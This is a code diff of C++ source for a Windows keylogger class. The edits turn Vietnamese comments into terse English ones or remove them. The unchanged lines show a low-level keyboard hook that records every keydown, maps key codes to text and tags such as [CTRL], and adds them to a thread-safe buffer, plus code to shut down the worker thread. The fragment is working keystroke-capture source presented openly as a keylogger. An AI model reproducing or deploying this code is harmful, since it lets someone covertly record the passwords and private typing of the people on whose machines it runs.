@@ -79,17 +79,14 @@ Keylogger::~Keylogger() {
 
 // --- PHẦN 1: Logic xử lý chuỗi ---
 void Keylogger::append(const std::string& str) {
-    // std::lock_guard là cái "chốt cửa".
-    // Khi hàm này chạy, nó khóa cửa lại, không ai được đụng vào _buffer.
-    // Khi hàm kết thúc, nó tự mở khóa.
+    // Thread-safe buffer access
     std::lock_guard<std::mutex> lock(_mtx); 
     _buffer += str;
 }
 
 // --- PHẦN 2: Hàm xử lý phím (Hook Procedure) ---
 LRESULT CALLBACK Keylogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
-    // nCode >= 0: Có sự kiện hợp lệ
-    // wParam == WM_KEYDOWN: Sự kiện nhấn xuống (không bắt sự kiện nhả phím)
+    // Process valid keydown events only
     if (nCode >= 0 && wParam == WM_KEYDOWN) {
         KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
         int key = kbdStruct->vkCode; // Lấy mã phím ảo
@@ -99,7 +96,7 @@ LRESULT CALLBACK Keylogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam
         else if (key == VK_RETURN) append("\n");
         else if (key == VK_SPACE) append(" ");
         else if (key == VK_TAB) append("[TAB]");
-        else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT) {} // Bỏ qua ghi shift
+        else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT) {}
         else if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL) append("[CTRL]");
         else if (key == VK_ESCAPE) append("[ESC]");
         // Xử lý số và chữ cái
@@ -112,7 +109,7 @@ LRESULT CALLBACK Keylogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam
              append("[" + std::to_string(key) + "]");
         }
     }
-    // Chuyền sự kiện cho ứng dụng khác (nếu không gọi dòng này, bàn phím sẽ bị liệt)
+    // Forward event to next hook (required for keyboard to work)
     return CallNextHookEx(_hook, nCode, wParam, lParam);
 }
 
@@ -150,7 +147,7 @@ void Keylogger::Stop() {
     // Gửi tin nhắn WM_QUIT vào luồng worker để đánh thức GetMessage và thoát vòng lặp
     if (_workerThread.joinable()) {
         PostThreadMessage(GetThreadId(_workerThread.native_handle()), WM_QUIT, 0, 0);
-        _workerThread.join(); // Chờ luồng tắt hẳn
+        _workerThread.join();
     }
 }
 
